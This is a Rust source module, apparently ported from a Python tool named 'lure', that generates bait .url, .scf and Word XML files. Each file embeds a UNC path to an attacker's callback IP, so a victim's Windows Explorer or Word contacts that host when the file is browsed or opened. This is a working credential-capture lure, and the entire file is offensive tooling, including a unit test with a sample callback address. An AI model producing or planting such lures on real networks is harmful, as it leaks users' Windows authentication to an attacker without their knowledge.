//! Bait payload generators.
//!
//! Byte-for-byte identical to the originals (Python `lure` 1.x), pinned by
//! golden tests in tests/golden_payloads.rs. The contents are text; the only
//! variable is the callback IP embedded in each UNC path.

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Kind {
    Url,
    Scf,
    Xml,
}

impl Kind {
    /// Canonical order, matching the original tool: url, scf, xml.
    pub const ALL: [Kind; 3] = [Kind::Url, Kind::Scf, Kind::Xml];

    pub fn ext(self) -> &'static str {
        match self {
            Kind::Url => "url",
            Kind::Scf => "scf",
            Kind::Xml => "xml",
        }
    }

    pub fn parse(s: &str) -> Option<Kind> {
        match s {
            "url" => Some(Kind::Url),
            "scf" => Some(Kind::Scf),
            "xml" => Some(Kind::Xml),
            _ => None,
        }
    }
}

/// Render one payload. Returns (remote file name, contents).
pub fn render(kind: Kind, callback: &str, basename: &str) -> (String, String) {
    let body = match kind {
        // Internet shortcut: Explorer resolves the icon over UNC on browse.
        Kind::Url => format!(
            "[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\{callback}\\%USERNAME%.icon\nIconIndex=1\n"
        ),
        // Shell command file: same trick, older and still honoured.
        Kind::Scf => format!(
            "[Shell]\nCommand=2\nIconFile=\\\\{callback}\\tools\\nc.ico\n[Taskbar]\nCommand=ToggleDesktop\n"
        ),
        // Word XML: reaches for a remote stylesheet when opened.
        Kind::Xml => format!(
            "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n<?mso-application progid='Word.Document'?>\n<?xml-stylesheet type='text/xsl' href='\\\\{callback}\\lure.xsl' ?>\n"
        ),
    };
    (format!("{basename}.{}", kind.ext()), body)
}

/// All payloads for a callback/basename pair, in canonical order.
pub fn render_all(kinds: &[Kind], callback: &str, basename: &str) -> Vec<(String, String)> {
    kinds
        .iter()
        .map(|&k| render(k, callback, basename))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scf_contents() {
        let (name, body) = render(Kind::Scf, "10.10.14.3", "@lure");
        assert_eq!(name, "@lure.scf");
        assert_eq!(
            body,
            "[Shell]\nCommand=2\nIconFile=\\\\10.10.14.3\\tools\\nc.ico\n[Taskbar]\nCommand=ToggleDesktop\n"
        );
    }
}
